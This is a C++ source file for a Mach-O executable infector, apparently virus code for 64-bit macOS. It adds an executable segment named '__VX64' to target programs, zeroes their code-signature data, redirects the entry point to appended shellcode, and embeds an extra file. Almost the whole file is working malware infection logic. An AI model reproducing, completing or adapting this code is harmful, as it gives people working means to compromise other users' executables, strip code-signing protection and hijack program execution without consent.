//
//  infect64.cpp
//  mach-o infector
//
//  Created by Pest on 27.11.14.
//  Copyright (c) 2014 coru.ws. All rights reserved.
//


#include "infect64.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <mach-o/loader.h>
#include "sc64.h"

static uint64_t align(uint64_t x,uint64_t y){
    return (x+(y-1))&(~(y-1));
}


static uint64_t atorva64(uint8 *buf,uint32 size,uint64_t a){
    uint8 *pen=buf+size;
    uint8 *p=buf;
    mach_header_64 *h=(mach_header_64*)p;
    p+=sizeof(mach_header_64);
    if (p>pen)
        return -1;
    
    if (h->magic!=MH_MAGIC_64)
        return -1;
    if (h->filetype!=MH_EXECUTE)
        return -1;
    load_command *lc;
    for (int i=0;i<h->ncmds;i++){
        lc=(load_command*)p;
        if ((p+sizeof(load_command))>pen)
            return -1;
        p+=lc->cmdsize;
        if (p>pen)
            return -1;
        if (lc->cmd==LC_SEGMENT_64){
            segment_command_64 *sg=(segment_command_64*)lc;
            if (sg->fileoff<=a && a<(sg->fileoff+sg->filesize)){
                return sg->vmaddr+(a-sg->fileoff);
            }
        }
    }
    
    return -1;
}


static uint64_t rvatoa64(uint8 *buf,uint32 size,uint64_t rva){
    uint8 *pen=buf+size;
    uint8 *p=buf;
    mach_header_64 *h=(mach_header_64*)p;
    p+=sizeof(mach_header_64);
    if (p>pen)
        return -1;
    
    if (h->magic!=MH_MAGIC_64)
        return -1;
    if (h->filetype!=MH_EXECUTE)
        return -1;
    load_command *lc;
    for (int i=0;i<h->ncmds;i++){
        lc=(load_command*)p;
        if ((p+sizeof(load_command))>pen)
            return -1;
        p+=lc->cmdsize;
        if (p>pen)
            return -1;
        if (lc->cmd==LC_SEGMENT_64){
            segment_command_64 *sg=(segment_command_64*)lc;
            if (sg->vmaddr<=rva && rva<(sg->vmaddr+sg->vmsize)){
                return sg->fileoff+(rva-sg->vmaddr);
            }
        }
    }
    
    return -1;
}


bool add_section64(uint8 *buf,uint32 size,uint32 sizevirus,uint32 &padding,uint32 &oep,uint32 &vep){
    uint8 *pen=buf+size;
    uint8 *p=buf;
    mach_header_64 *h=(mach_header_64*)p;
    p+=sizeof(mach_header_64);
    if (p>pen)
        return false;
    
    if (h->magic!=MH_MAGIC_64)
        return false;
    if (h->filetype!=MH_EXECUTE)
        return false;
    load_command *lc;
    segment_command_64 *min=0,*max=0;
    _STRUCT_X86_THREAD_STATE64 *lc_unixthread=0;
    entry_point_command *lc_main=0;
    linkedit_data_command *lc_sign=0;
    for (int i=0;i<h->ncmds;i++){
        lc=(load_command*)p;
        if ((p+sizeof(load_command))>pen)
            return false;
        p+=lc->cmdsize;
        if (p>pen)
            return false;
        if (lc->cmd==LC_UNIXTHREAD){
            x86_state_hdr *h=(x86_state_hdr*)(lc+1);
            if (h->flavor==x86_THREAD_STATE64){
                lc_unixthread=(_STRUCT_X86_THREAD_STATE64 *)(h+1);
                
            }
        }
        
        if (lc->cmd==LC_MAIN){
            lc_main=(entry_point_command*)lc;
        }
        

        if (lc->cmd==LC_CODE_SIGNATURE){
            lc_sign=(linkedit_data_command*)lc;
        }

        
        if (lc->cmd==LC_SEGMENT_64){
            segment_command_64 *sg=(segment_command_64*)lc;
            if (sg->filesize>0){
                if (!min){
                    min=sg;
                }
                if (!max){
                    max=sg;
                }
                if (sg->fileoff>max->fileoff){
                    max=sg;
                }
                if (sg->fileoff<min->fileoff){
                    min=sg;
                }
                
            }
        }
    }
    
    if (!min || !max || (!lc_unixthread && !lc_main))
        return false;
    
    section_64 *sec=(section_64*)((uint8*)min+sizeof(segment_command_64));
    section_64 *minsec=sec;
    for (int j=0;j<min->nsects;j++){
        if (sec[j].offset<minsec->offset)
            minsec=&sec[j];
    }
    
    int lenfree=minsec->offset-(h->sizeofcmds+sizeof(mach_header_64));
    if (lenfree<(sizeof(segment_command_64)+sizeof(section_64)))
        return false;
    
    padding=align(max->fileoff+max->filesize,0x1000)-(max->fileoff+max->filesize);
    lc_sign->dataoff=0;
    lc_sign->datasize=0;
    //patching headers
    h->ncmds++;
    segment_command_64 *sg=(segment_command_64*)((uint8*)h+h->sizeofcmds+sizeof(mach_header_64));
    h->sizeofcmds+=sizeof(segment_command_64)+sizeof(section_64);
    memset(sg,0,sizeof(segment_command_64));
    sec=(section_64*)(sg+1);
    memset(sec,0,sizeof(section_64));
    sg->cmd=LC_SEGMENT_64;
    sg->cmdsize=sizeof(segment_command_64)+sizeof(section_64);
    strcpy(sg->segname,"__VX64");
    sg->vmaddr=align(max->vmaddr+max->vmsize,0x1000);
    sg->vmsize=sizevirus;
    sg->fileoff=align(max->fileoff+max->filesize,0x1000);
    
    sg->filesize=sizevirus;
    sg->maxprot=sg->initprot=VM_PROT_READ|VM_PROT_WRITE|VM_PROT_EXECUTE;
    sg->nsects=1;
    strcpy(sec->sectname,"__vx64");
    strcpy(sec->segname,"__VX64");
    sec->addr=sg->vmaddr;
    sec->size=sizevirus;
    sec->offset=sg->fileoff;
    sec->align=0;
    sec->flags=S_REGULAR;
    if (lc_unixthread){
        oep=lc_unixthread->__rip;
        vep=lc_unixthread->__rip=sg->vmaddr;
    }
    
    if (lc_main){
        oep=lc_main->entryoff+min->vmaddr;
        vep=sg->vmaddr;
        lc_main->entryoff=sg->vmaddr-min->vmaddr;
    }
    return true;
}
#pragma pack(push,1)
struct tconfig{
    uint32 oep;
    uint32 size;
};
#pragma pack(push,1)

bool infect64(uint8 *&buf,uint32 &size,uint8 *file,uint32 lfile){
    uint8 *shell=(uint8*)sc64;
    uint32 lshell=sizeof(sc64)-1;
    tconfig *c=(tconfig*)(sc64+lshell-sizeof(tconfig));
    c->size=lfile;
    
    uint32 padding,oep,vep,lsec;
    lsec=lshell+lfile;
    if (!add_section64(buf,size,lsec,padding,oep,vep))
        return false;
    uint8 *bnew=(uint8*)malloc(size+padding+lsec);
    if (!bnew)
        return false;
    memcpy(bnew,buf,size);
    c->oep=vep-oep;
    memcpy(bnew+size+padding,shell,lshell);
    memcpy(bnew+size+padding+lshell,file,lfile);
    //memset(bnew+size,0xcc,padding+lsec);
//    bnew[size+padding]=0xE9;
//    *((uint32*)(&bnew[size+1+padding]))=oep-(vep+5);
    free(buf);
    buf=bnew;
    size=size+padding+lsec;
    return true;
}

